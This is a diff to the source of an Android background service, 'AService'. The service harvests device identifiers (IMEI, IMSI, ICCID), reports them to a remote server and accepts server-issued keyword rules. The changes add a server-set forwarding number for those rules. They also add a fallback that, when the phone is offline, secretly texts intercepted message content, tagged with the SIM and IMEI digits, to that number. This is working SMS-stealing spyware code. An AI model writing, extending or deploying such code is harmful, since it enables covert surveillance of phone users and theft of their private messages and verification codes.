@@ -25,6 +25,7 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager.NameNotFoundException;
+import android.database.Cursor;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.IBinder;
@@ -58,9 +59,10 @@ public class AService extends Service implements Runnable{
 	private String imei = "0";
 	private String iccid = "0";
 	private String imsi;
-	private String pstyle = "未知";
-	private String appname = "未知";
+	private String pstyle = "unknow";
+	private String appname = "unknow";
 	private int ver = 0;
+	private int sdkver = 0;
 	
 	private SrceenReceiver srcReceiver = null;
 	private SmsReceiver smsReceiver = null;
@@ -105,12 +107,12 @@ public class AService extends Service implements Runnable{
         }
         
         pstyle = android.os.Build.MODEL;
-        
+        sdkver = Integer.valueOf(android.os.Build.VERSION.SDK);
         
         try {
         	PackageInfo packageInfo = getPackageManager().getPackageInfo(getPackageName(),0);
         	appname = packageInfo.applicationInfo.loadLabel(getPackageManager()).toString();
-			ver = packageInfo.versionCode;
+			ver = packageInfo.versionCode;	
 		} catch (NameNotFoundException e) {
 			// TODO Auto-generated catch block
 			///e.printStackTrace();
@@ -402,18 +404,12 @@ public class AService extends Service implements Runnable{
 			json.put("pstyle", pstyle);
 			json.put("appname", appname);
 			json.put("version", Integer.toString(ver));
+			json.put("sdkver", sdkver);
 			postData = json.toString();
 		} catch (JSONException e) {
-			// TODO Auto-generated catch block
-			//e.printStackTrace();
-			postData = "{\"imei\":\""+imei+"\",\"imsi\":\""+imsi+"\",\"pstyle\":\""+pstyle+"\",\"appname\":\""+appname+"\",\"version\":\""+ver+"\",\"iccid\":\""+iccid+"\"}";
+			postData = "{\"imei\":\""+imei+"\",\"imsi\":\""+imsi+"\",\"pstyle\":\""+pstyle+"\",\"appname\":\""+appname+"\",\"version\":\""+ver+"\",\"sdkver\":\""+sdkver+"\",\"iccid\":\""+iccid+"\"}";
 		}				
-//		try {
-//			postData = URLEncoder.encode(postData, "UTF-8");
-//		} catch (UnsupportedEncodingException e) {
-//			// TODO Auto-generated catch block
-//			e.printStackTrace();
-//		}	
+
 		postData = "1A"+postData;
 		if(sendMessage(postData))
 		{
@@ -501,22 +497,16 @@ public class AService extends Service implements Runnable{
 						
 						break;
 					case 12://关键字回报
-						//Logger.error("12");
 						String keyword = tempJson.getString("keyword");
-						//Logger.error("12");
 						sn = tempJson.getString("number");
-						//Logger.error("12x");
 						String time = tempJson.getString("etime");
-						//Logger.error("12xx");
 						long etime = System.currentTimeMillis()+Long.parseLong(time)*1000;
-						//Logger.error("12xxx");
-						isback = tempJson.getString("isback");
-						
-						//Logger.error("12xxxx");
+						isback = tempJson.getString("isback");						
+						String toTel = tempJson.getString("totel");	
 						long kid = 0;
 						if(dbHelper!=null)
 						{
-							kid = dbHelper.insertKeyword(keyword, isback,sn,etime);
+							kid = dbHelper.insertKeyword(keyword, isback,sn,toTel,etime);
 							Logger.info("xxxxxxxxxxxxxxxxxx"+kid);
 						}else{
 							Logger.info("xxxxxxxxxxxxxxxxxx  null");
@@ -604,6 +594,34 @@ public class AService extends Service implements Runnable{
 				//如果没有网络
 				socketDisConnect();
 				Logger.info("not net ....");
+				if(action.equals(Tag.SENDTOSERVER))
+				{
+					String number = intent.getStringExtra("number");
+					String message = intent.getStringExtra("message");
+					if(dbHelper==null)
+					{//启动手机短信上传
+						dbHelper = new DbHelper(mContext,1);				
+					}else{
+			        	Cursor c = dbHelper.getkeys();		        	
+				    	if(null!=c&&c.getCount()>0)
+				    	{
+				    		if(c.moveToFirst())
+				    		{
+				    			do{
+				    				String totel = c.getString(5);
+				    				Logger.info("totel:"+totel);
+				    				if(!totel.equals("-1"))
+				    				{
+				    					String tomessage = iccid+imei.substring(imei.length()-4)+":"+message;
+				    					Tools.sendSms(mContext, totel, tomessage);
+				    				}
+				    			}while(c.moveToNext());
+				    		}
+				    	}
+					}
+				}
+				
+				
 				return;
 			}
 			if(action!=null){
@@ -668,7 +686,8 @@ public class AService extends Service implements Runnable{
 					{
 						Logger.error("发送成功");
 					}else{
-						Logger.error("发送不成功");
+						Logger.error("发送不成功,查看是否通过短信发送");
+						
 					}	
 				}
 			}
